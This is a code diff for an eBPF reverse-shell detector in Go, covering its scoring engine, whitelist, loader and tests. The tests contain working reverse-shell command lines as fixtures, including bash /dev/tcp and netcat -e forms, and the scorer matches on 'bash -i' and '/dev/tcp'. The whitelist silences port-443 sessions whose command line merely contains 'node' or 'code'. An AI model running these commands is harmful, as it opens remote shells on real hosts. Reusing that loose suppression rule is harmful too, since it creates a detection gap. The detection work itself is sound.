+type Engine struct {
+	cfg            Config
+	logger         *zap.Logger
+	pathSet        map[string]struct{}
+	processNameSet map[string]struct{}
+	userSet        map[uint32]struct{}
+	ipNets         []*net.IPNet
+	ipSet          map[string]struct{}
+	baseline       *BaselineModel
+}
+
+func NewEngine(cfg Config, logger *zap.Logger) *Engine {
+	if cfg.ExecConnectWindowSeconds <= 0 {
+		cfg.ExecConnectWindowSeconds = 20
+	}
+	if cfg.MinScore <= 0 {
+		cfg.MinScore = 0.75
+	}
+	if logger == nil {
+		logger = zap.NewNop()
+	}
+
+	e := &Engine{
+		cfg:            cfg,
+		logger:         logger,
+		pathSet:        make(map[string]struct{}),
+		processNameSet: make(map[string]struct{}),
+		userSet:        make(map[uint32]struct{}),
+		ipNets:         make([]*net.IPNet, 0),
+		ipSet:          make(map[string]struct{}),
+		baseline:       NewBaselineModel(),
+	}
+	e.buildWhitelistCaches()
+	if cfg.EnableBaseline {
+		if cfg.BaselineFile == "" {
+			cfg.BaselineFile = "/var/lib/rsbp/baseline.json"
+		}
+		loaded, err := LoadBaseline(cfg.BaselineFile)
+		if err == nil && loaded != nil {
+			e.baseline = loaded
+		} else {
+			logger.Debug("baseline load skipped", zap.Error(err))
+		}
+	}
+	return e
+}
+
+func (e *Engine) Evaluate(state *correlation.SessionState, ev types.SyscallEvent, hostID string) []*types.ReverseShellAlert {
+	if state == nil {
+		return nil
+	}
+
+	baseScore := e.behaviorScore(state)
+	e.logger.Debug("detection evaluating session",
+		zap.Uint32("pid", state.PID),
+		zap.Float64("score", baseScore),
+	)
+
+	if e.isWhitelisted(state) {
+		e.logger.Debug("session suppressed by whitelist",
+			zap.Uint32("pid", state.PID),
+			zap.String("exe", state.ExePath),
+			zap.String("remote_ip", state.RemoteIP.String()),
+		)
+		return nil
+	}
+
+	if baseScore < e.cfg.MinScore {
+		e.baseline.Observe(state, baseScore, false)
+		return nil
+	}
+
+	alert := &types.ReverseShellAlert{
+		AlertID:       buildAlertID(fmt.Sprintf("pid-%d", state.PID), ev.TimestampNS, ev.SyscallNr),
+		Timestamp:     time.Unix(0, int64(ev.TimestampNS)).UTC(),
+		HostID:        hostID,
+		SessionID:     fmt.Sprintf("pid-%d", state.PID),
+		EventChain:    correlatedChain(state),
+		MITREAttack:   []string{"T1059", "T1104"},
+		Severity:      scoreToSeverity(baseScore),
+		Confidence:    baseScore,
+		RuleID:        "RSBP-REV-SHELL-001",
+		Description:   "Correlated syscall chain matched reverse shell behavior",
+		CorrelationID: buildCorrelationID(fmt.Sprintf("%d:%d:%d", state.PID, state.PPID, state.StartTime.UnixNano())),
+		Metadata: map[string]string{
+			"detector":   "heuristic-chain-v1",
+			"window_sec": fmt.Sprintf("%d", e.cfg.ExecConnectWindowSeconds),
+			"category":   fmt.Sprintf("%d", state.Category),
+		},
+		Process: types.ProcessContext{
+			PID:     state.PID,
+			PPID:    state.PPID,
+			UID:     state.UID,
+			GID:     state.GID,
+			Comm:    processComm(state),
+			Exe:     state.ExePath,
+			Cmdline: state.Cmdline,
+		},
+		Network: types.NetworkContext{
+			RemoteIP:   state.RemoteIP.String(),
+			RemotePort: state.RemotePort,
+			Protocol:   "tcp",
+		},
+	}
+
+	e.logger.Debug("alert generated",
+		zap.String("session_id", alert.SessionID),
+		zap.Float64("confidence", alert.Confidence),
+		zap.String("severity", string(alert.Severity)),
+	)
+
+	e.baseline.Observe(state, baseScore, true)
+
+	return []*types.ReverseShellAlert{alert}
+}
+
+func (e *Engine) SaveBaseline() error {
+	if e == nil || !e.cfg.EnableBaseline || e.baseline == nil {
+		return nil
+	}
+	if e.cfg.BaselineFile == "" {
+		return nil
+	}
+	return e.baseline.Save(e.cfg.BaselineFile)
+}
+
+func (e *Engine) behaviorScore(state *correlation.SessionState) float64 {
+	if !state.HasExecve || !state.HasConnect {
+		return 0
+	}
+	if state.LastUpdate.Sub(state.StartTime) > time.Duration(e.cfg.ExecConnectWindowSeconds)*time.Second {
+		return 0
+	}
+
+	score := 0.55
+	if state.HasSocket {
+		score += 0.10
+	}
+	if state.HasDupToStdio {
+		score += 0.20
+	}
+	if state.HasForkWithPipe {
+		score += 0.10
+	}
+	if state.Category == 2 || state.Category == 3 {
+		score += 0.05
+	}
+
+	if strings.Contains(strings.ToLower(state.Cmdline), "bash -i") || strings.Contains(strings.ToLower(state.Cmdline), "/dev/tcp") {
+		score += 0.10
+	}
+
+	if p := correlation.BestMatchPattern(state); p != nil {
+		score += p.Confidence * 0.05
+	}
+
+	if score > 1 {
+		score = 1
+	}
+	return score
+}
+
+func (e *Engine) buildWhitelistCaches() {
+	for _, p := range defaultProcessWhitelist {
+		name := strings.TrimSpace(strings.ToLower(p))
+		if name != "" {
+			e.processNameSet[name] = struct{}{}
+		}
+	}
+
+	for _, p := range e.cfg.Whitelist.Paths {
+		cleaned := strings.TrimSpace(strings.ToLower(path.Clean(p)))
+		if cleaned != "" {
+			e.pathSet[cleaned] = struct{}{}
+		}
+	}
+	for _, p := range e.cfg.Whitelist.ProcessNames {
+		name := strings.TrimSpace(strings.ToLower(p))
+		if name != "" {
+			e.processNameSet[name] = struct{}{}
+		}
+	}
+	for _, u := range e.cfg.Whitelist.Users {
+		e.userSet[u] = struct{}{}
+	}
+	for _, raw := range e.cfg.Whitelist.IPs {
+		candidate := strings.TrimSpace(raw)
+		if candidate == "" {
+			continue
+		}
+		if strings.Contains(candidate, "/") {
+			_, ipNet, err := net.ParseCIDR(candidate)
+			if err == nil {
+				e.ipNets = append(e.ipNets, ipNet)
+			}
+			continue
+		}
+		if ip := net.ParseIP(candidate); ip != nil {
+			e.ipSet[ip.String()] = struct{}{}
+		}
+	}
+}
+
+func (e *Engine) isWhitelisted(state *correlation.SessionState) bool {
+	if state == nil {
+		return false
+	}
+	if shouldSuppressNode443Telemetry(state) {
+		return true
+	}
+	if len(e.pathSet) == 0 && len(e.processNameSet) == 0 && len(e.userSet) == 0 && len(e.ipSet) == 0 && len(e.ipNets) == 0 {
+		return false
+	}
+
+	if _, ok := e.userSet[state.UID]; ok {
+		return true
+	}
+
+	fullPath := strings.TrimSpace(strings.ToLower(path.Clean(state.ExePath)))
+	if fullPath != "" {
+		if _, ok := e.pathSet[fullPath]; ok {
+			return true
+		}
+		base := strings.ToLower(filepath.Base(fullPath))
+		if _, ok := e.processNameSet[base]; ok {
+			return true
+		}
+	}
+
+	if state.RemoteIP != nil {
+		ip := state.RemoteIP
+		if v4 := ip.To4(); v4 != nil {
+			ip = v4
+		}
+		if _, ok := e.ipSet[ip.String()]; ok {
+			return true
+		}
+		for _, netw := range e.ipNets {
+			if netw.Contains(ip) {
+				return true
+			}
+		}
+	}
+
+	return false
+}
+
+func buildAlertID(sessionID string, ts uint64, syscall uint32) string {
+	seed := fmt.Sprintf("%s:%d:%d", sessionID, ts, syscall)
+	hash := sha1.Sum([]byte(seed))
+	return "rsbp-" + hex.EncodeToString(hash[:8])
+}
+
+func buildCorrelationID(seed string) string {
+	hash := sha1.Sum([]byte(seed))
+	return hex.EncodeToString(hash[:8])
+}
+
+func scoreToSeverity(score float64) types.AlertSeverity {
+	switch {
+	case score >= 0.9:
+		return types.SeverityCritical
+	case score >= 0.7:
+		return types.SeverityHigh
+	case score >= 0.5:
+		return types.SeverityMedium
+	default:
+		return types.SeverityLow
+	}
+}
+
+func correlatedChain(state *correlation.SessionState) []string {
+	if state == nil {
+		return nil
+	}
+
+	out := make([]string, 0, 5)
+	if state.HasExecve {
+		out = append(out, "execve")
+	}
+	if state.HasSocket {
+		out = append(out, "socket")
+	}
+	if state.HasConnect {
+		out = append(out, "connect")
+	}
+	if state.HasDupToStdio {
+		out = append(out, "dup2")
+	}
+	if state.HasForkWithPipe {
+		out = append(out, "fork_pipe")
+	}
+	return out
+}
+
+func processComm(state *correlation.SessionState) string {
+	if state == nil {
+		return ""
+	}
+	if len(state.ProcessTree) > 0 {
+		return state.ProcessTree[len(state.ProcessTree)-1].Comm
+	}
+	if state.ExePath != "" {
+		return filepath.Base(state.ExePath)
+	}
+	if state.RemoteIP != nil && state.RemoteIP.Equal(net.IPv4zero) {
+		return "unknown"
+	}
+	return "unknown"
+}
+
+=== internal/detection/whitelist.go ===
+package detection
+
+import (
+	"path/filepath"
+	"strings"
+
+	"github.com/yoursec/rsbp/internal/correlation"
+)
+
+var defaultProcessWhitelist = []string{
+	"node",
+	"cpuusage.sh",
+	"code",
+	"docker",
+}
+
+func shouldSuppressNode443Telemetry(s *correlation.SessionState) bool {
+	if s == nil {
+		return false
+	}
+	if s.RemotePort != 443 {
+		return false
+	}
+
+	comm := ""
+	if len(s.ProcessTree) > 0 {
+		comm = strings.ToLower(strings.TrimSpace(s.ProcessTree[len(s.ProcessTree)-1].Comm))
+	}
+
+	exe := strings.ToLower(filepath.Base(strings.TrimSpace(s.ExePath)))
+	cmdline := strings.ToLower(s.Cmdline)
+	if comm == "node" || exe == "node" || strings.Contains(cmdline, "node") {
+		return true
+	}
+	if comm == "code" || exe == "code" || strings.Contains(cmdline, "code") {
+		return true
+	}
+
+	if strings.Contains(comm, "node") {
+		return true
+	}
+	if strings.Contains(comm, "code") {
+		return true
+	}
+
+	for _, n := range s.ProcessTree {
+		p := strings.ToLower(strings.TrimSpace(n.Comm))
+		if p == "node" || p == "code" || strings.Contains(p, "node") || strings.Contains(p, "code") {
+			return true
+		}
+	}
+
+	return false
+}
+
+=== internal/detection/engine_test.go ===
+package detection
+
+import (
+	"net"
+	"testing"
+	"time"
+
+	"go.uber.org/zap"
+
+	"github.com/yoursec/rsbp/internal/correlation"
+	"github.com/yoursec/rsbp/internal/types"
+)
+
+func TestEvaluateGeneratesAlert(t *testing.T) {
+	eng := NewEngine(Config{ExecConnectWindowSeconds: 10, MinScore: 0.55}, zap.NewNop())
+	state := &correlation.SessionState{
+		PID:           4321,
+		PPID:          1,
+		UID:           1000,
+		GID:           1000,
+		ExePath:       "/bin/bash",
+		Cmdline:       "bash -i >& /dev/tcp/8.8.8.8/4444 0>&1",
+		HasExecve:     true,
+		HasSocket:     true,
+		HasConnect:    true,
+		HasDupToStdio: true,
+		RemoteIP:      net.ParseIP("8.8.8.8"),
+		RemotePort:    4444,
+		StartTime:     time.Now().Add(-2 * time.Second),
+		LastUpdate:    time.Now(),
+		Category:      1,
+	}
+	ev := types.SyscallEvent{SyscallNr: 42, TimestampNS: uint64(time.Now().UnixNano())}
+
+	alerts := eng.Evaluate(state, ev, "host-a")
+	if len(alerts) != 1 {
+		t.Fatalf("expected 1 alert, got %d", len(alerts))
+	}
+	if alerts[0].HostID != "host-a" {
+		t.Fatalf("unexpected host id: %s", alerts[0].HostID)
+	}
+	if alerts[0].Severity == "" {
+		t.Fatalf("severity should be populated")
+	}
+	if alerts[0].SessionID == "" || alerts[0].AlertID == "" || alerts[0].CorrelationID == "" {
+		t.Fatalf("expected alert IDs to be populated")
+	}
+}
+
+func TestEvaluateSuppressedWhenBelowMinScore(t *testing.T) {
+	eng := NewEngine(Config{ExecConnectWindowSeconds: 10, MinScore: 0.9}, zap.NewNop())
+	state := &correlation.SessionState{
+		PID:        55,
+		ExePath:    "/bin/bash",
+		HasExecve:  true,
+		HasConnect: true,
+		RemoteIP:   net.ParseIP("8.8.8.8"),
+		RemotePort: 443,
+		StartTime:  time.Now().Add(-2 * time.Second),
+		LastUpdate: time.Now(),
+	}
+	ev := types.SyscallEvent{SyscallNr: 42, TimestampNS: uint64(time.Now().UnixNano())}
+	if got := eng.Evaluate(state, ev, "host"); len(got) != 0 {
+		t.Fatalf("expected no alerts due to min score gate")
+	}
+}
+
+func TestBehaviorScoreWindowAndBranches(t *testing.T) {
+	eng := NewEngine(Config{ExecConnectWindowSeconds: 2, MinScore: 0.1}, zap.NewNop())
+
+	late := &correlation.SessionState{
+		HasExecve:  true,
+		HasConnect: true,
+		StartTime:  time.Now().Add(-10 * time.Second),
+		LastUpdate: time.Now(),
+	}
+	if score := eng.behaviorScore(late); score != 0 {
+		t.Fatalf("expected zero score when window exceeded, got %f", score)
+	}
+
+	full := &correlation.SessionState{
+		ExePath:         "/usr/bin/python3",
+		Cmdline:         "python3 -c import socket",
+		HasExecve:       true,
+		HasSocket:       true,
+		HasConnect:      true,
+		HasDupToStdio:   true,
+		HasForkWithPipe: true,
+		Category:        2,
+		RemoteIP:        net.ParseIP("8.8.8.8"),
+		RemotePort:      9001,
+		StartTime:       time.Now().Add(-1 * time.Second),
+		LastUpdate:      time.Now(),
+	}
+	if score := eng.behaviorScore(full); score <= 0.9 {
+		t.Fatalf("expected high score for rich behavior, got %f", score)
+	}
+}
+
+func TestHelperFunctions(t *testing.T) {
+	id := buildAlertID("session-1", 123, 42)
+	if len(id) == 0 || id[:5] != "rsbp-" {
+		t.Fatalf("unexpected alert id: %s", id)
+	}
+	cid := buildCorrelationID("seed")
+	if len(cid) == 0 {
+		t.Fatalf("expected correlation id")
+	}
+
+	state := &correlation.SessionState{
+		ExePath:         "/bin/bash",
+		HasExecve:       true,
+		HasSocket:       true,
+		HasConnect:      true,
+		HasDupToStdio:   true,
+		HasForkWithPipe: true,
+		ProcessTree: []correlation.ProcessNode{
+			{Comm: "bash"},
+		},
+	}
+	chain := correlatedChain(state)
+	if len(chain) != 5 {
+		t.Fatalf("expected full chain, got %v", chain)
+	}
+	if comm := processComm(state); comm != "bash" {
+		t.Fatalf("unexpected process comm: %s", comm)
+	}
+	if comm := processComm(&correlation.SessionState{ExePath: "/usr/bin/python3"}); comm != "python3" {
+		t.Fatalf("expected basename fallback, got %s", comm)
+	}
+	if comm := processComm(&correlation.SessionState{RemoteIP: net.IPv4zero}); comm != "unknown" {
+		t.Fatalf("expected unknown comm fallback, got %s", comm)
+	}
+}
+
+=== internal/detection/baseline.go ===
+package detection
+
+import (
+	"encoding/json"
+	"os"
+	"path/filepath"
+	"sync"
+	"time"
+
+	"github.com/yoursec/rsbp/internal/correlation"
+)
+
+type BaselineModel struct {
+	mu          sync.Mutex
+	UpdatedAt   time.Time         `json:"updated_at"`
+	TotalEvents uint64            `json:"total_events"`
+	TotalAlerts uint64            `json:"total_alerts"`
+	PatternHits map[string]uint64 `json:"pattern_hits"`
+	AvgScore    float64           `json:"avg_score"`
+}
+
+func NewBaselineModel() *BaselineModel {
+	return &BaselineModel{PatternHits: map[string]uint64{}}
+}
+
+func LoadBaseline(path string) (*BaselineModel, error) {
+	data, err := os.ReadFile(path)
+	if err != nil {
+		return nil, err
+	}
+	var m BaselineModel
+	if err := json.Unmarshal(data, &m); err != nil {
+		return nil, err
+	}
+	if m.PatternHits == nil {
+		m.PatternHits = map[string]uint64{}
+	}
+	return &m, nil
+}
+
+func (b *BaselineModel) Observe(state *correlation.SessionState, score float64, alerted bool) {
+	if b == nil {
+		return
+	}
+	b.mu.Lock()
+	defer b.mu.Unlock()
+
+	b.TotalEvents++
+	if alerted {
+		b.TotalAlerts++
+	}
+	if b.TotalEvents == 1 {
+		b.AvgScore = score
+	} else {
+		b.AvgScore = ((b.AvgScore * float64(b.TotalEvents-1)) + score) / float64(b.TotalEvents)
+	}
+	if p := correlation.BestMatchPattern(state); p != nil {
+		b.PatternHits[p.Name]++
+	}
+	b.UpdatedAt = time.Now().UTC()
+}
+
+func (b *BaselineModel) Save(path string) error {
+	if b == nil || path == "" {
+		return nil
+	}
+	b.mu.Lock()
+	payload, err := json.MarshalIndent(b, "", "  ")
+	b.mu.Unlock()
+	if err != nil {
+		return err
+	}
+
+	dir := filepath.Dir(path)
+	if err := os.MkdirAll(dir, 0o755); err != nil {
+		return err
+	}
+	tmp := path + ".tmp"
+	if err := os.WriteFile(tmp, payload, 0o644); err != nil {
+		return err
+	}
+	return os.Rename(tmp, path)
+}
+
+=== internal/ebpf/loader.go ===
+package ebpf
+
+import (
+	"bufio"
+	"bytes"
+	"context"
+	"encoding/binary"
+	"errors"
+	"fmt"
+	"os"
+	"runtime"
+	"strconv"
+	"strings"
+	"sync"
+	"sync/atomic"
+	"time"
+
+	"github.com/cilium/ebpf"
+	"github.com/cilium/ebpf/link"
+	"github.com/cilium/ebpf/ringbuf"
+	"github.com/cilium/ebpf/rlimit"
+	"go.uber.org/zap"
+
+	"github.com/yoursec/rsbp/internal/types"
+)
+
+type Stats struct {
+	EventsRead     uint64
+	LostEvents     uint64
+	AttachedProbes int
+}
+
+type Loader struct {
+	logger *zap.Logger
+
+	coll     *ebpf.Collection
+	reader   *ringbuf.Reader
+	links    []link.Link
+	bootTime time.Time
+
+	eventsRead atomic.Uint64
+	lostEvents atomic.Uint64
+
+	closeOnce sync.Once
+}
+
+type rawSyscallEvent struct {
+	PID            uint32
+	PPID           uint32
+	UID            uint32
+	GID            uint32
+	SyscallNr      uint32
+	FD             int32
+	RemoteIP4      uint32
+	RemoteIP6      [16]byte
+	RemotePort     uint16
+	Family         uint16
+	TimestampNS    uint64
+	Comm           [16]byte
+	ExecPath       [256]byte
+	Args           [512]byte
+	HasExecve      uint8
+	HasSocket      uint8
+	HasConnect     uint8
+	HasDup2Stdio   uint8
+	ForkParentPID  uint32
+	SuspiciousMask uint32
+}
+
+func New(logger *zap.Logger) (*Loader, error) {
+	if logger == nil {
+		return nil, fmt.Errorf("ebpf loader: %w", fmt.Errorf("logger is nil"))
+	}
+
+	if err := ensureKernelVersion(); err != nil {
+		return nil, fmt.Errorf("ebpf loader: %w", err)
+	}
+	if err := ensurePrivileges(); err != nil {
+		return nil, fmt.Errorf("ebpf loader: %w", err)
+	}
+	if err := rlimit.RemoveMemlock(); err != nil {
+		return nil, fmt.Errorf("ebpf loader: %w", err)
+	}
+
+	var objs bpfObjects
+	if err := loadBpfObjects(&objs, nil); err != nil {
+		return nil, fmt.Errorf("ebpf loader: %w", err)
+	}
+
+	spec, err := loadBpf()
+	if err != nil {
+		objs.Close()
+		return nil, fmt.Errorf("ebpf loader: %w", err)
+	}
+
+	coll, err := ebpf.NewCollection(spec)
+	if err != nil {
+		objs.Close()
+		return nil, fmt.Errorf("ebpf loader: %w", err)
+	}
+
+	links, err := attachTracepoints(coll)
+	if err != nil {
+		coll.Close()
+		objs.Close()
+		return nil, fmt.Errorf("ebpf loader: %w", err)
+	}
+
+	eventsMap, ok := coll.Maps["events"]
+	if !ok {
+		for _, lnk := range links {
+			_ = lnk.Close()
+		}
+		coll.Close()
+		objs.Close()
+		return nil, fmt.Errorf("ebpf loader: %w", fmt.Errorf("events map not found"))
+	}
+
+	reader, err := ringbuf.NewReader(eventsMap)
+	if err != nil {
+		for _, lnk := range links {
+			_ = lnk.Close()
+		}
+		coll.Close()
+		objs.Close()
+		return nil, fmt.Errorf("ebpf loader: %w", err)
+	}
+
+	_ = objs.Close()
+
+	return &Loader{
+		logger:   logger,
+		coll:     coll,
+		reader:   reader,
+		links:    links,
+		bootTime: getBootTime(),
+	}, nil
+}
+
+func (l *Loader) Run(ctx context.Context, events chan<- types.SyscallEvent) error {
+	if l == nil {
+		return fmt.Errorf("ebpf loader: %w", fmt.Errorf("loader is nil"))
+	}
+	if l.reader == nil {
+		return fmt.Errorf("ebpf loader: %w", fmt.Errorf("reader is not initialized"))
+	}
+
+	errCh := make(chan error, 1)
+
+	go func() {
+		defer close(errCh)
+		for {
+			record, err := l.reader.Read()
+			if err != nil {
+				if errors.Is(err, ringbuf.ErrClosed) {
+					errCh <- nil
+					return
+				}
+				errCh <- fmt.Errorf("ebpf loader: %w", err)
+				return
+			}
+
+			var raw rawSyscallEvent
+			if err := binary.Read(bytes.NewReader(record.RawSample), binary.LittleEndian, &raw); err != nil {
+				l.lostEvents.Add(1)
+				l.logger.Warn("failed to decode raw sample", zap.Error(err))
+				continue
+			}
+
+			event := types.SyscallEvent{
+				PID:            raw.PID,
+				PPID:           raw.PPID,
+				UID:            raw.UID,
+				GID:            raw.GID,
+				SyscallNr:      raw.SyscallNr,
+				FD:             raw.FD,
+				RemoteIP4:      raw.RemoteIP4,
+				RemoteIP6:      raw.RemoteIP6,
+				RemotePort:     raw.RemotePort,
+				Family:         raw.Family,
+				TimestampNS:    toUnixTimestampNS(l.bootTime, raw.TimestampNS),
+				Comm:           raw.Comm,
+				ExecPath:       raw.ExecPath,
+				Args:           raw.Args,
+				HasExecve:      raw.HasExecve,
+				HasSocket:      raw.HasSocket,
+				HasConnect:     raw.HasConnect,
+				HasDup2Stdio:   raw.HasDup2Stdio,
+				ForkParentPID:  raw.ForkParentPID,
+				SuspiciousMask: raw.SuspiciousMask,
+			}
+
+			l.logger.Info("EVENT RECEIVED",
+				zap.Uint32("pid", event.PID),
+				zap.String("comm", strings.TrimRight(string(event.Comm[:]), "\x00")),
+			)
+
+			select {
+			case events <- event:
+				l.eventsRead.Add(1)
+			case <-ctx.Done():
+				errCh <- nil
+				return
+			}
+		}
+	}()
+
+	select {
+	case <-ctx.Done():
+		if err := l.Close(); err != nil {
+			return fmt.Errorf("ebpf loader: %w", err)
+		}
+		return nil
+	case err := <-errCh:
+		if closeErr := l.Close(); closeErr != nil && err == nil {
+			return fmt.Errorf("ebpf loader: %w", closeErr)
+		}
+		if err != nil {
+			return fmt.Errorf("ebpf loader: %w", err)
+		}
+		return nil
+	}
+}
+
+func toUnixTimestampNS(bootTime time.Time, ktimeNS uint64) uint64 {
+	if ktimeNS == 0 {
+		return 0
+	}
+	if bootTime.IsZero() {
+		bootTime = time.Now()
+	}
+	eventTime := bootTime.Add(time.Duration(ktimeNS))
+	return uint64(eventTime.UnixNano())
+}
+
+func getBootTime() time.Time {
+	data, err := os.ReadFile("/proc/stat")
+	if err == nil {
+		for _, line := range strings.Split(string(data), "\n") {
+			if strings.HasPrefix(line, "btime ") {
+				fields := strings.Fields(line)
+				if len(fields) >= 2 {
+					btime, parseErr := strconv.ParseInt(fields[1], 10, 64)
+					if parseErr == nil {
+						return time.Unix(btime, 0)
+					}
+				}
+			}
+		}
+	}
+	return time.Now()
+}
+
+func (l *Loader) Close() error {
+	if l == nil {
+		return nil
+	}
+
+	var closeErr error
+	l.closeOnce.Do(func() {
+		if l.reader != nil {
+			if err := l.reader.Close(); err != nil && !errors.Is(err, ringbuf.ErrClosed) {
+				closeErr = fmt.Errorf("ebpf loader: %w", err)
+			}
+		}
+
+		for _, lnk := range l.links {
+			if lnk == nil {
+				continue
+			}
+			if err := lnk.Close(); err != nil && closeErr == nil {
+				closeErr = fmt.Errorf("ebpf loader: %w", err)
+			}
+		}
+
+		if l.coll != nil {
+			l.coll.Close()
+		}
+	})
+
+	return closeErr
+}
+
+func (l *Loader) Stats() Stats {
+	if l == nil {
+		return Stats{}
+	}
+	return Stats{
+		EventsRead:     l.eventsRead.Load(),
+		LostEvents:     l.lostEvents.Load(),
+		AttachedProbes: len(l.links),
+	}
+}
+
+func attachTracepoints(coll *ebpf.Collection) ([]link.Link, error) {
+	bindings := []struct {
+		program string
+		group   string
+		name    string
+	}{
+		{program: "trace_enter_execve", group: "syscalls", name: "sys_enter_execve"},
+		{program: "trace_exit_execve", group: "syscalls", name: "sys_exit_execve"},
+		{program: "trace_enter_socket", group: "syscalls", name: "sys_enter_socket"},
+		{program: "trace_exit_socket", group: "syscalls", name: "sys_exit_socket"},
+		{program: "trace_enter_connect", group: "syscalls", name: "sys_enter_connect"},
+		{program: "trace_enter_dup2", group: "syscalls", name: "sys_enter_dup2"},
+		{program: "trace_enter_dup3", group: "syscalls", name: "sys_enter_dup3"},
+		{program: "trace_enter_fork", group: "syscalls", name: "sys_enter_fork"},
+		{program: "trace_enter_clone3", group: "syscalls", name: "sys_enter_clone3"},
+		{program: "trace_enter_pipe", group: "syscalls", name: "sys_enter_pipe"},
+		{program: "trace_enter_pipe2", group: "syscalls", name: "sys_enter_pipe2"},
+	}
+
+	links := make([]link.Link, 0, len(bindings))
+	for _, b := range bindings {
+		prog, ok := coll.Programs[b.program]
+		if !ok {
+			for _, lnk := range links {
+				_ = lnk.Close()
+			}
+			return nil, fmt.Errorf("missing program %s", b.program)
+		}
+
+		lnk, err := link.Tracepoint(b.group, b.name, prog, nil)
+		if err != nil {
+			for _, opened := range links {
+				_ = opened.Close()
+			}
+			return nil, err
+		}
+		links = append(links, lnk)
+	}
+
+	return links, nil
+}
+
+func ensureKernelVersion() error {
+	if runtime.GOOS != "linux" {
+		return nil
+	}
+
+	data, err := os.ReadFile("/proc/sys/kernel/osrelease")
+	if err != nil {
+		return err
+	}
+	release := strings.TrimSpace(string(data))
+	major, minor, err := parseKernelVersion(release)
+	if err != nil {
+		return err
+	}
+
+	if major < 5 || (major == 5 && minor < 8) {
+		return fmt.Errorf("kernel %s is unsupported, require >= 5.8", release)
+	}
+
+	return nil
+}
+
+func ensurePrivileges() error {
+	if runtime.GOOS != "linux" {
+		return nil
+	}
+
+	buf, err := os.ReadFile("/proc/self/status")
+	if err != nil {
+		return err
+	}
+	data := string(buf)
+
+	var capEffHex string
+	s := bufio.NewScanner(strings.NewReader(data))
+	for s.Scan() {
+		line := s.Text()
+		if strings.HasPrefix(line, "CapEff:") {
+			parts := strings.Fields(line)
+			if len(parts) >= 2 {
+				capEffHex = parts[1]
+			}
+			break
+		}
+	}
+	if capEffHex == "" {
+		return fmt.Errorf("failed to read CapEff from /proc/self/status")
+	}
+
+	val, err := strconv.ParseUint(capEffHex, 16, 64)
+	if err != nil {
+		return err
+	}
+
+	const capSysAdmin = 21
+	const capBPF = 39
+	hasSysAdmin := ((val >> capSysAdmin) & 1) == 1
+	hasBPF := ((val >> capBPF) & 1) == 1
+
+	if !hasSysAdmin && !hasBPF {
+		return fmt.Errorf("missing required capabilities: need CAP_SYS_ADMIN or CAP_BPF")
+	}
+
+	return nil
+}
+
+func parseKernelVersion(release string) (int, int, error) {
+	parts := strings.Split(release, ".")
+	if len(parts) < 2 {
+		return 0, 0, fmt.Errorf("invalid kernel release: %s", release)
+	}
+
+	major, err := strconv.Atoi(parts[0])
+	if err != nil {
+		return 0, 0, err
+	}
+
+	minorPart := parts[1]
+	if idx := strings.IndexAny(minorPart, "-+"); idx >= 0 {
+		minorPart = minorPart[:idx]
+	}
+	minor, err := strconv.Atoi(minorPart)
+	if err != nil {
+		return 0, 0, err
+	}
+
+	return major, minor, nil
+}
+
+=== test/integration/scenarios_test.go ===
+package integration
+
+import (
+	"net"
+	"testing"
+	"time"
+
+	"github.com/yoursec/rsbp/internal/correlation"
+	"github.com/yoursec/rsbp/internal/types"
+)
+
+func TestEndToEndScenarios(t *testing.T) {
+	correlation.SetAllowPrivateRemote(false)
+	defer correlation.SetAllowPrivateRemote(true)
+
+	tests := []Scenario{
+		{
+			Name: "bash direct dup2 reverse shell",
+			Events: []types.SyscallEvent{
+				event(3001, 1, 59, "/bin/bash", "bash -i", 0, "", 0),
+				event(3001, 2, 41, "/bin/bash", "", 3, "", 0),
+				event(3001, 3, 42, "/bin/bash", "", 3, "1.2.3.4", 4444),
+				event(3001, 4, 33, "/bin/bash", "", 3, "", 0),
+				event(3001, 5, 33, "/bin/bash", "", 3, "", 0),
+				event(3001, 6, 33, "/bin/bash", "", 3, "", 0),
+			},
+			ExpectedFired:    true,
+			ExpectedSeverity: types.SeverityHigh,
+			ExpectedMITRE:    []string{"T1059", "T1104"},
+		},
+		{
+			Name: "python reverse shell",
+			Events: []types.SyscallEvent{
+				event(3002, 1, 59, "/usr/bin/python3", "python3 -c import socket", 0, "", 0),
+				event(3002, 2, 41, "/usr/bin/python3", "", 5, "", 0),
+				event(3002, 3, 42, "/usr/bin/python3", "", 5, "9.9.9.9", 5555),
+				event(3002, 4, 33, "/usr/bin/python3", "", 5, "", 0),
+			},
+			ExpectedFired:    true,
+			ExpectedSeverity: types.SeverityMedium,
+			ExpectedMITRE:    []string{"T1059", "T1104"},
+		},
+		{
+			Name: "netcat reverse shell",
+			Events: []types.SyscallEvent{
+				event(3003, 1, 59, "/usr/bin/nc", "nc 4.4.4.4 4444 -e /bin/sh", 0, "", 0),
+				event(3003, 2, 42, "/usr/bin/nc", "", 7, "4.4.4.4", 4444),
+			},
+			ExpectedFired:    true,
+			ExpectedSeverity: types.SeverityMedium,
+			ExpectedMITRE:    []string{"T1059", "T1104"},
+		},
+		{
+			Name: "private target suppressed",
+			Events: []types.SyscallEvent{
+				event(3004, 1, 59, "/bin/bash", "bash -i", 0, "", 0),
+				event(3004, 2, 41, "/bin/bash", "", 3, "", 0),
+				event(3004, 3, 42, "/bin/bash", "", 3, "192.168.1.10", 4444),
+				event(3004, 4, 33, "/bin/bash", "", 3, "", 0),
+			},
+			ExpectedFired: false,
+		},
+		{
+			Name: "timing window exceeded suppressed",
+			Events: []types.SyscallEvent{
+				event(3005, 1, 59, "/bin/bash", "bash -i", 0, "", 0),
+				event(3005, 7, 41, "/bin/bash", "", 3, "", 0),
+				event(3005, 13, 42, "/bin/bash", "", 3, "2.2.2.2", 4444),
+				event(3005, 19, 33, "/bin/bash", "", 3, "", 0),
+			},
+			ExpectedFired: false,
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.Name, func(t *testing.T) {
+			RunScenario(t, tt)
+		})
+	}
+}
+
+func event(pid uint32, sec int64, syscall uint32, exe string, args string, fd int32, ip string, port uint16) types.SyscallEvent {
+	ev := types.SyscallEvent{
+		PID:         pid,
+		PPID:        1,
+		UID:         1000,
+		GID:         1000,
+		SyscallNr:   syscall,
+		FD:          fd,
+		TimestampNS: uint64(time.Unix(sec, 0).UnixNano()),
+		Family:      2,
+	}
+	copy(ev.ExecPath[:], []byte(exe))
+	copy(ev.Args[:], []byte(args))
+	copy(ev.Comm[:], []byte("proc"))
+	if ip != "" {
+		v4 := net.ParseIP(ip).To4()
+		if v4 != nil {
+			ev.RemoteIP4 = uint32(v4[0]) | uint32(v4[1])<<8 | uint32(v4[2])<<16 | uint32(v4[3])<<24
+			ev.RemotePort = port
+		}
+	}
+	return ev
+}
+
